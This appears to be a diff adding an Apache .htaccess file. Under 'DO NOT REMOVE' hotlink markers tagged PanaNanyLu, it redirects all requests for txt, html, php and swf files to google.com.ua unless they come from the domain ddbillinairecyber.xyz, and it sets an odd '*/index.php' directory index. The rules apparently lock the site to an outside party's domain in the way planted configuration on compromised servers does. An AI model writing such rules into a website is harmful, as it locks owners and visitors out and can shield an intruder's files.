@@ -1,0 +1,10 @@
+<IfModule dir_module>
+    DirectoryIndex */index.php
+</IfModule>
+# DO NOT REMOVE THIS LINE AND THE LINES BELOW HOTLINKID:PanaNanyLu
+RewriteEngine on
+RewriteCond %{HTTP_REFERER} !^$
+RewriteCond %{HTTP_REFERER} !^http(s)?://(www\.)?ddbillinairecyber.xyz/.*$      [NC]
+RewriteRule .*\.(txt|html|htm|php|swf)$ http://google.com.ua [R,NC]
+# DO NOT REMOVE THIS LINE AND THE LINES ABOVE PanaNanyLu:HOTLINKID
+
